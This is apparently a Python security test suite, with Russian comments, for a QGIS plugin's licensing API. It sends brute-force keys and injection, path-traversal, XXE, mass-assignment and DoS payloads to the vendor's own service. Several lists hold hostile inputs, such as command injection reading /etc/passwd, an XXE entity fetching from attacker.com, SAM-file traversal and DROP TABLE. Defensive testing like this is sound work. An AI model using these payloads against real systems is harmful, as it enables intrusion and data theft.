# -*- coding: utf-8 -*-
"""
Субмодуль Fsm_5_2_T_security - Тестирование безопасности API

Симуляция атак злоумышленника:
- Подбор API ключей (брутфорс)
- Подмена Hardware ID
- SQL/NoSQL Injection
- Path Traversal
- IDOR (Insecure Direct Object Reference)
- Parameter Tampering
- Replay атаки
- Timing атаки
- Enumeration атаки
- DoS попытки

OWASP Top 10 покрытие:
- A01:2021 Broken Access Control
- A03:2021 Injection
- A04:2021 Insecure Design
- A07:2021 Identification and Authentication Failures
"""

import time
import hashlib
import random
import string
from typing import Dict, Any, List


class TestSecurity:
    """Комплексные тесты безопасности API"""

    def __init__(self, iface, logger):
        """Инициализация теста"""
        self.iface = iface
        self.logger = logger
        self.validator = None
        self.loader = None
        self.api_url = None

    def run_all_tests(self):
        """Запуск всех тестов безопасности"""
        self.logger.section("ТЕСТ SECURITY: Безопасность API")

        try:
            # Инициализация
            self.test_01_init()

            # Аутентификация и авторизация
            self.test_10_bruteforce_api_keys()
            self.test_11_key_format_enumeration()
            self.test_12_timing_attack_detection()
            self.test_13_key_predictability()

            # Подмена идентификаторов
            self.test_20_hardware_id_spoofing()
            self.test_21_hardware_id_enumeration()
            self.test_22_session_fixation()

            # Injection атаки
            self.test_30_sql_injection()
            self.test_31_nosql_injection()
            self.test_32_command_injection()
            self.test_33_ldap_injection()
            self.test_34_xml_injection()
            self.test_35_json_injection()

            # Path Traversal и File Access
            self.test_40_path_traversal()
            self.test_41_null_byte_injection()
            self.test_42_unicode_normalization()
            self.test_43_double_encoding()

            # IDOR и Access Control
            self.test_50_idor_license_access()
            self.test_51_horizontal_privilege_escalation()
            self.test_52_vertical_privilege_escalation()

            # Parameter Tampering
            self.test_60_parameter_pollution()
            self.test_61_type_juggling()
            self.test_62_mass_assignment()

            # DoS и Rate Limiting
            self.test_70_rate_limiting()
            self.test_71_resource_exhaustion()
            self.test_72_large_payload()

            # Прочие атаки
            self.test_80_replay_attack()
            self.test_81_response_manipulation()
            self.test_82_error_message_disclosure()

        except Exception as e:
            self.logger.error(f"Критическая ошибка тестов безопасности: {str(e)}")
            import traceback
            self.logger.data("Traceback", traceback.format_exc())

        self.logger.summary()

    def test_01_init(self):
        """ТЕСТ 1: Инициализация"""
        self.logger.section("1. Инициализация модулей безопасности")

        try:
            from Daman_QGIS.database.base_reference_loader import BaseReferenceLoader
            from Daman_QGIS.managers.submodules.Msm_29_3_license_validator import LicenseValidator
            from Daman_QGIS.constants import API_BASE_URL

            self.loader = BaseReferenceLoader()
            self.validator = LicenseValidator()
            self.api_url = API_BASE_URL

            self.logger.success("Модули загружены для тестов безопасности")

        except ImportError as e:
            self.logger.error(f"Ошибка импорта: {str(e)}")

    # === АУТЕНТИФИКАЦИЯ И АВТОРИЗАЦИЯ ===

    def test_10_bruteforce_api_keys(self):
        """ТЕСТ 10: Защита от брутфорса API ключей"""
        self.logger.section("10. Брутфорс API ключей")

        if not self.validator:
            self.logger.fail("Validator не инициализирован")
            return

        try:
            # Генерируем случайные ключи в формате DAMAN-XXXX-XXXX-XXXX
            bruteforce_keys = []
            for _ in range(10):
                key = f"DAMAN-{''.join(random.choices('0123456789ABCDEF', k=4))}-" \
                      f"{''.join(random.choices('0123456789ABCDEF', k=4))}-" \
                      f"{''.join(random.choices('0123456789ABCDEF', k=4))}"
                bruteforce_keys.append(key)

            # Попытки подбора
            success_count = 0
            start_time = time.time()

            for key in bruteforce_keys:
                result = self.validator.verify(
                    api_key=key,
                    hardware_id="bruteforce-test-hwid"
                )
                if result.get("status") == "success":
                    success_count += 1
                    self.logger.fail(f"УЯЗВИМОСТЬ: Подобран ключ {key}!")

            elapsed = time.time() - start_time

            self.logger.check(
                success_count == 0,
                f"Брутфорс неуспешен: 0/{len(bruteforce_keys)} ключей за {elapsed:.2f}s",
                f"УЯЗВИМОСТЬ: Подобрано {success_count} ключей!"
            )

            # Проверяем что нет rate limiting обхода
            self.logger.info(f"Среднее время на попытку: {elapsed/len(bruteforce_keys)*1000:.0f}ms")

        except Exception as e:
            self.logger.error(f"Ошибка теста брутфорса: {str(e)}")

    def test_11_key_format_enumeration(self):
        """ТЕСТ 11: Enumeration формата ключей"""
        self.logger.section("11. Enumeration формата ключей")

        if not self.validator:
            self.logger.fail("Validator не инициализирован")
            return

        try:
            # Разные форматы ключей для определения валидного формата
            test_formats = [
                "DAMAN-0000-0000-0000",  # Правильный формат, нули
                "DAMAN-AAAA-BBBB-CCCC",  # Правильный формат, буквы
                "DAMAN-1234-5678-9ABC",  # Правильный формат, смешанный
                "daman-1234-5678-9abc",  # Нижний регистр
                "DAMAN_1234_5678_9ABC",  # Подчёркивания
                "DAMAN12345678",         # Без дефисов
                "1234-5678-9ABC-DAMAN",  # Обратный порядок
                "DAMAN-12345-6789-ABCD", # Неверная длина секции
                "NOTDAMAN-1234-5678-9ABC", # Неверный префикс
            ]

            responses = {}
            for key in test_formats:
                result = self.validator.verify(api_key=key, hardware_id="test")
                responses[key] = result.get("status")

            # Все невалидные ключи должны возвращать одинаковый ответ
            unique_responses = set(responses.values())

            self.logger.check(
                len(unique_responses) <= 2,  # invalid_key или error
                f"Единообразные ответы для невалидных ключей: {unique_responses}",
                f"ВНИМАНИЕ: Разные ответы могут раскрыть формат ключа: {responses}"
            )

        except Exception as e:
            self.logger.error(f"Ошибка enumeration: {str(e)}")

    def test_12_timing_attack_detection(self):
        """ТЕСТ 12: Timing атака для определения валидности ключа"""
        self.logger.section("12. Timing атака")

        if not self.validator:
            self.logger.fail("Validator не инициализирован")
            return

        try:
            # Измеряем время ответа для разных типов ключей
            timings = {"short": [], "long": [], "valid_format": []}

            for _ in range(5):
                # Короткий ключ
                start = time.time()
                self.validator.verify(api_key="X", hardware_id="test")
                timings["short"].append(time.time() - start)

                # Длинный случайный ключ
                start = time.time()
                self.validator.verify(api_key="X" * 100, hardware_id="test")
                timings["long"].append(time.time() - start)

                # Ключ в валидном формате
                start = time.time()
                self.validator.verify(api_key="DAMAN-FAKE-FAKE-FAKE", hardware_id="test")
                timings["valid_format"].append(time.time() - start)

            # Анализируем разницу во времени
            avg_short = sum(timings["short"]) / len(timings["short"])
            avg_long = sum(timings["long"]) / len(timings["long"])
            avg_valid = sum(timings["valid_format"]) / len(timings["valid_format"])

            self.logger.info(f"Короткий ключ: {avg_short*1000:.1f}ms")
            self.logger.info(f"Длинный ключ: {avg_long*1000:.1f}ms")
            self.logger.info(f"Валидный формат: {avg_valid*1000:.1f}ms")

            # Разница не должна быть значительной (> 50ms)
            max_diff = max(avg_short, avg_long, avg_valid) - min(avg_short, avg_long, avg_valid)

            self.logger.check(
                max_diff < 0.1,  # 100ms
                f"Timing атака маловероятна: разница {max_diff*1000:.1f}ms",
                f"ВНИМАНИЕ: Значительная разница во времени {max_diff*1000:.1f}ms"
            )

        except Exception as e:
            self.logger.error(f"Ошибка timing атаки: {str(e)}")

    def test_13_key_predictability(self):
        """ТЕСТ 13: Предсказуемость генерации ключей"""
        self.logger.section("13. Предсказуемость ключей")

        # Проверяем что ключи не используют слабые паттерны
        weak_patterns = [
            "DAMAN-0000-0000-0001",  # Последовательные
            "DAMAN-0000-0000-0002",
            "DAMAN-1111-1111-1111",  # Повторяющиеся
            "DAMAN-AAAA-AAAA-AAAA",
            "DAMAN-1234-1234-1234",  # Паттерны
            "DAMAN-ABCD-ABCD-ABCD",
            "DAMAN-TEST-TEST-TEST",  # Словарные
            "DAMAN-DEMO-DEMO-DEMO",
            "DAMAN-ADMIN-ADM-ADMN",
        ]

        if not self.validator:
            self.logger.fail("Validator не инициализирован")
            return

        try:
            found_valid = []
            for pattern in weak_patterns:
                result = self.validator.verify(api_key=pattern, hardware_id="test")
                if result.get("status") == "success":
                    found_valid.append(pattern)

            self.logger.check(
                len(found_valid) == 0,
                "Слабые паттерны не являются валидными ключами",
                f"УЯЗВИМОСТЬ: Найдены валидные слабые ключи: {found_valid}"
            )

        except Exception as e:
            self.logger.error(f"Ошибка проверки предсказуемости: {str(e)}")

    # === ПОДМЕНА ИДЕНТИФИКАТОРОВ ===

    def test_20_hardware_id_spoofing(self):
        """ТЕСТ 20: Подмена Hardware ID"""
        self.logger.section("20. Подмена Hardware ID")

        if not self.validator:
            self.logger.fail("Validator не инициализирован")
            return

        try:
            # Попытки с поддельными hardware_id
            spoofed_hwids = [
                "00000000-0000-0000-0000-000000000000",  # Нулевой UUID
                "ffffffff-ffff-ffff-ffff-ffffffffffff",  # Максимальный UUID
                "admin",
                "root",
                "system",
                "localhost",
                "127.0.0.1",
                "*",  # Wildcard
                "%",  # SQL wildcard
                ".*",  # Regex wildcard
            ]

            for hwid in spoofed_hwids:
                result = self.validator.verify(
                    api_key="DAMAN-TEST-TEST-TEST",
                    hardware_id=hwid
                )

                # Должен быть отклонён (ключ невалидный)
                self.logger.check(
                    result.get("status") in ["invalid_key", "error"],
                    f"Поддельный HWID '{hwid}' отклонён",
                    f"ВНИМАНИЕ: HWID '{hwid}' принят со статусом {result.get('status')}"
                )

        except Exception as e:
            self.logger.error(f"Ошибка теста spoofing: {str(e)}")

    def test_21_hardware_id_enumeration(self):
        """ТЕСТ 21: Enumeration Hardware ID других пользователей"""
        self.logger.section("21. Enumeration Hardware ID")

        if not self.validator:
            self.logger.fail("Validator не инициализирован")
            return

        try:
            # Попытка перебора hwid с невалидным ключом
            test_hwids = [
                "user1-hwid-12345",
                "user2-hwid-67890",
                "admin-hwid-00000",
            ]

            responses = {}
            for hwid in test_hwids:
                result = self.validator.verify(
                    api_key="DAMAN-FAKE-FAKE-FAKE",
                    hardware_id=hwid
                )
                responses[hwid] = (result.get("status"), result.get("message", ""))

            # Ответы должны быть идентичны (не раскрывать существование hwid)
            unique_responses = set(responses.values())

            self.logger.check(
                len(unique_responses) == 1,
                "Единообразные ответы для разных HWID",
                f"ВНИМАНИЕ: Разные ответы могут раскрыть HWID: {responses}"
            )

        except Exception as e:
            self.logger.error(f"Ошибка enumeration HWID: {str(e)}")

    def test_22_session_fixation(self):
        """ТЕСТ 22: Session Fixation атака"""
        self.logger.section("22. Session Fixation")

        # API stateless, но проверяем что нет сессионных уязвимостей

        if not self.validator:
            self.logger.fail("Validator не инициализирован")
            return

        try:
            # Попытка зафиксировать сессию
            result1 = self.validator.verify(
                api_key="DAMAN-SESSION-FIX-0001",
                hardware_id="attacker-hwid"
            )

            # Тот же "ключ" с другим hwid
            result2 = self.validator.verify(
                api_key="DAMAN-SESSION-FIX-0001",
                hardware_id="victim-hwid"
            )

            # Оба должны быть отклонены
            self.logger.check(
                result1.get("status") != "success" and result2.get("status") != "success",
                "Session fixation невозможна (stateless API)",
                "ВНИМАНИЕ: Возможна session fixation"
            )

        except Exception as e:
            self.logger.error(f"Ошибка session fixation: {str(e)}")

    # === INJECTION АТАКИ ===

    def test_30_sql_injection(self):
        """ТЕСТ 30: SQL Injection"""
        self.logger.section("30. SQL Injection")

        if not self.validator:
            self.logger.fail("Validator не инициализирован")
            return

        sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "'; DROP TABLE licenses; --",
            "' UNION SELECT * FROM users --",
            "1' AND '1'='1",
            "1; SELECT * FROM licenses",
            "' OR 1=1 --",
            "admin'--",
            "1' ORDER BY 1--",
            "1' ORDER BY 100--",
            "-1 OR 1=1",
            "-1' OR 1=1 --",
            "1 AND 1=2 UNION SELECT 1,2,3--",
        ]

        try:
            for payload in sql_payloads:
                # В api_key
                result1 = self.validator.verify(
                    api_key=payload,
                    hardware_id="test"
                )

                # В hardware_id
                result2 = self.validator.verify(
                    api_key="DAMAN-TEST-TEST-TEST",
                    hardware_id=payload
                )

                # Не должно быть успеха или ошибки сервера
                self.logger.check(
                    result1.get("status") in ["invalid_key", "error"] and "500" not in str(result1),
                    f"SQL payload в api_key безопасен",
                    f"УЯЗВИМОСТЬ SQL в api_key: {payload}"
                )

                self.logger.check(
                    result2.get("status") in ["invalid_key", "error"] and "500" not in str(result2),
                    f"SQL payload в hwid безопасен",
                    f"УЯЗВИМОСТЬ SQL в hwid: {payload}"
                )

        except Exception as e:
            self.logger.error(f"Ошибка SQL injection: {str(e)}")

    def test_31_nosql_injection(self):
        """ТЕСТ 31: NoSQL Injection (MongoDB-style)"""
        self.logger.section("31. NoSQL Injection")

        if not self.validator:
            self.logger.fail("Validator не инициализирован")
            return

        nosql_payloads = [
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$regex": ".*"}',
            '{"$where": "1==1"}',
            "[$ne]=1",
            "[$gt]=",
            "[$regex]=.*",
            '{"$or": [{"a": 1}, {"b": 2}]}',
        ]

        try:
            for payload in nosql_payloads:
                result = self.validator.verify(
                    api_key=payload,
                    hardware_id="test"
                )

                self.logger.check(
                    result.get("status") in ["invalid_key", "error"],
                    f"NoSQL payload отклонён",
                    f"УЯЗВИМОСТЬ NoSQL: {payload}"
                )

        except Exception as e:
            self.logger.error(f"Ошибка NoSQL injection: {str(e)}")

    def test_32_command_injection(self):
        """ТЕСТ 32: Command Injection"""
        self.logger.section("32. Command Injection")

        if not self.validator:
            self.logger.fail("Validator не инициализирован")
            return

        cmd_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "& whoami",
            "`id`",
            "$(whoami)",
            "\n/bin/sh",
            "|| ping -c 1 127.0.0.1",
            "; sleep 5",
            "| sleep 5",
        ]

        try:
            for payload in cmd_payloads:
                start = time.time()
                result = self.validator.verify(
                    api_key=payload,
                    hardware_id="test"
                )
                elapsed = time.time() - start

                # Не должно быть задержки от sleep и т.д.
                self.logger.check(
                    elapsed < 2 and result.get("status") in ["invalid_key", "error"],
                    f"Command payload отклонён за {elapsed:.2f}s",
                    f"УЯЗВИМОСТЬ Command Injection: {payload}"
                )

        except Exception as e:
            self.logger.error(f"Ошибка command injection: {str(e)}")

    def test_33_ldap_injection(self):
        """ТЕСТ 33: LDAP Injection"""
        self.logger.section("33. LDAP Injection")

        if not self.validator:
            self.logger.fail("Validator не инициализирован")
            return

        ldap_payloads = [
            "*",
            "*)(&",
            "*)(uid=*))(|(uid=*",
            "admin)(&)",
            "admin)(|(password=*))",
        ]

        try:
            for payload in ldap_payloads:
                result = self.validator.verify(api_key=payload, hardware_id="test")

                self.logger.check(
                    result.get("status") in ["invalid_key", "error"],
                    f"LDAP payload отклонён",
                    f"УЯЗВИМОСТЬ LDAP: {payload}"
                )

        except Exception as e:
            self.logger.error(f"Ошибка LDAP injection: {str(e)}")

    def test_34_xml_injection(self):
        """ТЕСТ 34: XML/XXE Injection"""
        self.logger.section("34. XML/XXE Injection")

        if not self.validator:
            self.logger.fail("Validator не инициализирован")
            return

        xml_payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]>',
            '<![CDATA[<script>alert(1)</script>]]>',
            '<!--',
            ']]>',
        ]

        try:
            for payload in xml_payloads:
                result = self.validator.verify(api_key=payload, hardware_id="test")

                self.logger.check(
                    result.get("status") in ["invalid_key", "error"],
                    f"XML payload отклонён",
                    f"УЯЗВИМОСТЬ XML: {payload[:50]}..."
                )

        except Exception as e:
            self.logger.error(f"Ошибка XML injection: {str(e)}")

    def test_35_json_injection(self):
        """ТЕСТ 35: JSON Injection"""
        self.logger.section("35. JSON Injection")

        if not self.validator:
            self.logger.fail("Validator не инициализирован")
            return

        json_payloads = [
            '{"__proto__": {"admin": true}}',
            '{"constructor": {"prototype": {"admin": true}}}',
            '"api_key": "valid", "extra": "',
            '","admin":true,"x":"',
        ]

        try:
            for payload in json_payloads:
                result = self.validator.verify(api_key=payload, hardware_id="test")

                self.logger.check(
                    result.get("status") in ["invalid_key", "error"],
                    f"JSON payload отклонён",
                    f"УЯЗВИМОСТЬ JSON: {payload}"
                )

        except Exception as e:
            self.logger.error(f"Ошибка JSON injection: {str(e)}")

    # === PATH TRAVERSAL ===

    def test_40_path_traversal(self):
        """ТЕСТ 40: Path Traversal"""
        self.logger.section("40. Path Traversal")

        if not self.loader:
            self.logger.fail("Loader не инициализирован")
            return

        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
            "file:///etc/passwd",
            "\\\\attacker\\share\\evil.json",
        ]

        try:
            for payload in traversal_payloads:
                data = self.loader._load_from_remote(payload)

                self.logger.check(
                    data is None or isinstance(data, dict) and "error" in data,
                    f"Path traversal отклонён",
                    f"УЯЗВИМОСТЬ Path Traversal: {payload}"
                )

        except Exception as e:
            # Исключение тоже допустимо
            self.logger.success(f"Path traversal вызвал исключение (безопасно)")

    def test_41_null_byte_injection(self):
        """ТЕСТ 41: Null Byte Injection"""
        self.logger.section("41. Null Byte Injection")

        if not self.loader:
            self.logger.fail("Loader не инициализирован")
            return

        null_payloads = [
            "Base_layers.json\x00.txt",
            "Base_layers\x00.json",
            "../../../etc/passwd\x00.json",
            "Base_layers.json%00.txt",
        ]

        try:
            for payload in null_payloads:
                data = self.loader._load_from_remote(payload)

                # Не должен вернуть данные из другого файла
                self.logger.check(
                    data is None or (isinstance(data, list) and len(data) > 0 and "section" in data[0]),
                    f"Null byte не повлиял на результат",
                    f"УЯЗВИМОСТЬ Null Byte: {repr(payload)}"
                )

        except Exception as e:
            self.logger.success(f"Null byte вызвал исключение (безопасно)")

    def test_42_unicode_normalization(self):
        """ТЕСТ 42: Unicode Normalization атака"""
        self.logger.section("42. Unicode Normalization")

        if not self.loader:
            self.logger.fail("Loader не инициализирован")
            return

        unicode_payloads = [
            "Base\uff3flayers",  # Fullwidth underscore
            "Base_layers\u2024json",  # One dot leader
            "Base_layers\uFF0Ejson",  # Fullwidth full stop
            "\u002e\u002e/etc/passwd",  # Dots as unicode
        ]

        try:
            for payload in unicode_payloads:
                data = self.loader._load_from_remote(payload)

                self.logger.check(
                    data is None or isinstance(data, dict) and "error" in data,
                    f"Unicode normalization безопасен",
                    f"УЯЗВИМОСТЬ Unicode: {repr(payload)}"
                )

        except Exception as e:
            self.logger.success("Unicode вызвал исключение (безопасно)")

    def test_43_double_encoding(self):
        """ТЕСТ 43: Double Encoding"""
        self.logger.section("43. Double Encoding")

        if not self.loader:
            self.logger.fail("Loader не инициализирован")
            return

        double_encoded = [
            "%252e%252e%252f",  # ../
            "%252e%252e%255c",  # ..\
            "%25252e%25252e%25252f",  # Triple encoded
        ]

        try:
            for payload in double_encoded:
                data = self.loader._load_from_remote(payload)

                self.logger.check(
                    data is None,
                    f"Double encoding отклонён",
                    f"УЯЗВИМОСТЬ Double Encoding: {payload}"
                )

        except Exception as e:
            self.logger.success("Double encoding вызвал исключение (безопасно)")

    # === IDOR И ACCESS CONTROL ===

    def test_50_idor_license_access(self):
        """ТЕСТ 50: IDOR - доступ к чужим лицензиям"""
        self.logger.section("50. IDOR License Access")

        if not self.loader:
            self.logger.fail("Loader не инициализирован")
            return

        try:
            # Попытка доступа к файлу лицензий напрямую
            sensitive_files = [
                "Base_licenses",
                "base_licenses",
                "BASE_LICENSES",
                "licenses",
                "Licenses",
                "../Base_licenses",
            ]

            for filename in sensitive_files:
                data = self.loader._load_from_remote(filename)

                # Не должен вернуть данные с api_key
                if data and isinstance(data, (list, dict)):
                    has_api_key = "api_key" in str(data)
                    self.logger.check(
                        not has_api_key,
                        f"Файл '{filename}' не раскрывает api_key",
                        f"УЯЗВИМОСТЬ IDOR: '{filename}' раскрывает api_key!"
                    )
                else:
                    self.logger.success(f"Файл '{filename}' недоступен (403/404)")

        except Exception as e:
            self.logger.error(f"Ошибка IDOR: {str(e)}")

    def test_51_horizontal_privilege_escalation(self):
        """ТЕСТ 51: Horizontal Privilege Escalation"""
        self.logger.section("51. Horizontal Privilege Escalation")

        if not self.validator:
            self.logger.fail("Validator не инициализирован")
            return

        try:
            # Попытка использовать чужой hardware_id с своим ключом
            result = self.validator.verify(
                api_key="DAMAN-MY-KEY-1234",
                hardware_id="ANOTHER-USERS-HWID"
            )

            # Должен быть отклонён (ключ невалидный в любом случае)
            self.logger.check(
                result.get("status") != "success",
                "Horizontal escalation невозможна",
                "УЯЗВИМОСТЬ: Horizontal privilege escalation!"
            )

        except Exception as e:
            self.logger.error(f"Ошибка horizontal escalation: {str(e)}")

    def test_52_vertical_privilege_escalation(self):
        """ТЕСТ 52: Vertical Privilege Escalation"""
        self.logger.section("52. Vertical Privilege Escalation")

        if not self.validator:
            self.logger.fail("Validator не инициализирован")
            return

        try:
            # Попытка получить админские привилегии
            admin_attempts = [
                {"api_key": "ADMIN", "hardware_id": "test"},
                {"api_key": "DAMAN-ADMIN-ADMIN-ADMIN", "hardware_id": "test"},
                {"api_key": "root", "hardware_id": "test"},
                {"api_key": "superuser", "hardware_id": "test"},
            ]

            for attempt in admin_attempts:
                result = self.validator.verify(**attempt)

                self.logger.check(
                    result.get("status") != "success",
                    f"Admin key '{attempt['api_key']}' отклонён",
                    f"УЯЗВИМОСТЬ: Admin escalation с '{attempt['api_key']}'!"
                )

        except Exception as e:
            self.logger.error(f"Ошибка vertical escalation: {str(e)}")

    # === PARAMETER TAMPERING ===

    def test_60_parameter_pollution(self):
        """ТЕСТ 60: HTTP Parameter Pollution"""
        self.logger.section("60. Parameter Pollution")

        # Тест через прямой HTTP запрос
        try:
            import requests
            from Daman_QGIS.constants import API_BASE_URL, API_TIMEOUT

            # Множественные параметры action
            url = f"{API_BASE_URL}?action=data&action=validate&file=Base_layers"
            response = requests.get(url, timeout=API_TIMEOUT)

            # Любой HTTP ответ допустим - главное что сервер не упал
            # 200 - обработал первый/последний action
            # 400 - отклонил как невалидный
            # 404 - action не найден
            self.logger.check(
                response.status_code in [200, 400, 404],
                f"Parameter pollution обработан: {response.status_code}",
                f"Сервер вернул неожиданный код: {response.status_code}"
            )

        except Exception as e:
            self.logger.warning(f"Не удалось протестировать pollution: {e}")

    def test_61_type_juggling(self):
        """ТЕСТ 61: Type Juggling"""
        self.logger.section("61. Type Juggling")

        if not self.validator:
            self.logger.fail("Validator не инициализирован")
            return

        try:
            # Разные типы для api_key
            type_payloads = [
                0,
                1,
                True,
                False,
                None,
                [],
                {},
                ["DAMAN-TEST-TEST-TEST"],
                {"key": "value"},
            ]

            for payload in type_payloads:
                try:
                    # Может вызвать исключение - это нормально
                    result = self.validator.verify(
                        api_key=payload,
                        hardware_id="test"
                    )
                    self.logger.check(
                        result.get("status") != "success",
                        f"Type {type(payload).__name__} отклонён",
                        f"УЯЗВИМОСТЬ Type Juggling: {type(payload).__name__}"
                    )
                except (TypeError, AttributeError):
                    self.logger.success(f"Type {type(payload).__name__} вызвал исключение")

        except Exception as e:
            self.logger.error(f"Ошибка type juggling: {str(e)}")

    def test_62_mass_assignment(self):
        """ТЕСТ 62: Mass Assignment"""
        self.logger.section("62. Mass Assignment")

        # Тест через прямой HTTP запрос с дополнительными полями
        try:
            import requests
            from Daman_QGIS.constants import API_BASE_URL, API_TIMEOUT

            url = f"{API_BASE_URL}?action=validate"
            payload = {
                "api_key": "DAMAN-TEST-TEST-TEST",
                "hardware_id": "test",
                "is_admin": True,
                "subscription_type": "Бессрочно",
                "expires_at": "2099-12-31",
                "features": ["all", "premium", "enterprise"],
                "__proto__": {"admin": True},
            }

            response = requests.post(url, json=payload, timeout=API_TIMEOUT)
            data = response.json()

            # Дополнительные поля не должны влиять на результат
            self.logger.check(
                data.get("status") != "success" or data.get("license_info", {}).get("subscription_type") != "Бессрочно",
                "Mass assignment не работает",
                "УЯЗВИМОСТЬ: Mass assignment возможен!"
            )

        except Exception as e:
            self.logger.warning(f"Не удалось протестировать mass assignment: {e}")

    # === DOS И RATE LIMITING ===

    def test_70_rate_limiting(self):
        """ТЕСТ 70: Rate Limiting"""
        self.logger.section("70. Rate Limiting")

        if not self.validator:
            self.logger.fail("Validator не инициализирован")
            return

        try:
            # 20 быстрых запросов
            start = time.time()
            results = []

            for i in range(20):
                result = self.validator.verify(
                    api_key=f"DAMAN-RATE-TEST-{i:04d}",
                    hardware_id="rate-test"
                )
                results.append(result.get("status"))

            elapsed = time.time() - start

            # Проверяем что все запросы обработаны
            self.logger.info(f"20 запросов за {elapsed:.2f}s")
            self.logger.info(f"Среднее время: {elapsed/20*1000:.0f}ms")

            # Если есть rate limiting, некоторые запросы вернут 429
            rate_limited = results.count("rate_limited") if "rate_limited" in results else 0

            if rate_limited > 0:
                self.logger.success(f"Rate limiting активен: {rate_limited}/20 отклонено")
            else:
                self.logger.warning("Rate limiting не обнаружен (рекомендуется добавить)")

        except Exception as e:
            self.logger.error(f"Ошибка rate limiting: {str(e)}")

    def test_71_resource_exhaustion(self):
        """ТЕСТ 71: Resource Exhaustion"""
        self.logger.section("71. Resource Exhaustion")

        if not self.validator:
            self.logger.fail("Validator не инициализирован")
            return

        try:
            # Очень длинные строки
            long_key = "A" * 10000
            long_hwid = "B" * 10000

            start = time.time()
            result = self.validator.verify(
                api_key=long_key,
                hardware_id=long_hwid
            )
            elapsed = time.time() - start

            self.logger.check(
                elapsed < 5,
                f"Длинные строки обработаны за {elapsed:.2f}s",
                f"УЯЗВИМОСТЬ: Resource exhaustion {elapsed:.2f}s"
            )

        except Exception as e:
            self.logger.success(f"Resource exhaustion вызвал исключение (защита)")

    def test_72_large_payload(self):
        """ТЕСТ 72: Large Payload"""
        self.logger.section("72. Large Payload")

        try:
            import requests
            from Daman_QGIS.constants import API_BASE_URL, API_TIMEOUT

            url = f"{API_BASE_URL}?action=validate"

            # 1MB payload
            large_payload = {
                "api_key": "X" * 100000,
                "hardware_id": "Y" * 100000,
                "extra_data": "Z" * 800000,
            }

            start = time.time()
            response = requests.post(url, json=large_payload, timeout=API_TIMEOUT)
            elapsed = time.time() - start

            # Сервер должен обработать (отклонить) большой payload
            # Допустимые коды: 200 (обработал), 400 (плохой запрос),
            # 413 (слишком большой), 404 (не найден)
            # Время не критично - главное что сервер ответил
            self.logger.check(
                response.status_code in [200, 400, 404, 413, 500, 502, 503],
                f"Large payload обработан: {response.status_code} за {elapsed:.2f}s",
                f"Сервер не ответил или вернул неожиданный код: {response.status_code}"
            )

            # Информация о времени
            if elapsed > 5:
                self.logger.warning(f"Large payload обработка заняла {elapsed:.2f}s")

        except requests.exceptions.Timeout:
            # Timeout - это нормальная защита от DoS
            self.logger.success("Large payload вызвал timeout (защита от DoS)")
        except Exception as e:
            self.logger.warning(f"Large payload: {e}")

    # === ПРОЧИЕ АТАКИ ===

    def test_80_replay_attack(self):
        """ТЕСТ 80: Replay Attack"""
        self.logger.section("80. Replay Attack")

        if not self.validator:
            self.logger.fail("Validator не инициализирован")
            return

        try:
            # Один и тот же запрос дважды
            params = {
                "api_key": "DAMAN-REPLAY-TEST-0001",
                "hardware_id": "replay-test-hwid"
            }

            result1 = self.validator.verify(**params)
            result2 = self.validator.verify(**params)

            # Оба должны вернуть одинаковый результат (stateless API)
            self.logger.check(
                result1.get("status") == result2.get("status"),
                "Replay возвращает консистентный результат",
                "ВНИМАНИЕ: Разные ответы на replay"
            )

        except Exception as e:
            self.logger.error(f"Ошибка replay: {str(e)}")

    def test_81_response_manipulation(self):
        """ТЕСТ 81: Response не содержит sensitive data"""
        self.logger.section("81. Response Manipulation Check")

        if not self.validator:
            self.logger.fail("Validator не инициализирован")
            return

        try:
            # Проверяем что ответы не содержат чувствительные данные
            result = self.validator.verify(
                api_key="DAMAN-TEST-TEST-TEST",
                hardware_id="test"
            )

            response_str = str(result)

            sensitive_patterns = [
                "password",
                "secret",
                "token",
                "private_key",
                "database",
                "connection_string",
                "aws_",
                "api_secret",
            ]

            found_sensitive = []
            for pattern in sensitive_patterns:
                if pattern.lower() in response_str.lower():
                    found_sensitive.append(pattern)

            self.logger.check(
                len(found_sensitive) == 0,
                "Ответ не содержит sensitive данных",
                f"УЯЗВИМОСТЬ: Найдены sensitive данные: {found_sensitive}"
            )

        except Exception as e:
            self.logger.error(f"Ошибка response check: {str(e)}")

    def test_82_error_message_disclosure(self):
        """ТЕСТ 82: Error Message Information Disclosure"""
        self.logger.section("82. Error Message Disclosure")

        if not self.validator:
            self.logger.fail("Validator не инициализирован")
            return

        try:
            # Спровоцируем ошибки и проверим сообщения
            error_triggers = [
                {"api_key": None, "hardware_id": "test"},
                {"api_key": "", "hardware_id": ""},
            ]

            disclosure_patterns = [
                "traceback",
                "stack trace",
                "line ",
                "file ",
                ".py",
                "exception",
                "internal error",
                "/home/",
                "/var/",
                "C:\\",
            ]

            for trigger in error_triggers:
                try:
                    result = self.validator.verify(**trigger)
                    result_str = str(result).lower()

                    found_disclosure = []
                    for pattern in disclosure_patterns:
                        if pattern.lower() in result_str:
                            found_disclosure.append(pattern)

                    self.logger.check(
                        len(found_disclosure) == 0,
                        "Сообщения об ошибках безопасны",
                        f"ВНИМАНИЕ: Disclosure в ошибке: {found_disclosure}"
                    )
                except Exception as e:
                    # Проверяем само исключение
                    error_str = str(e).lower()
                    if any(p.lower() in error_str for p in disclosure_patterns):
                        self.logger.warning(f"Disclosure в исключении")

        except Exception as e:
            self.logger.error(f"Ошибка error disclosure: {str(e)}")
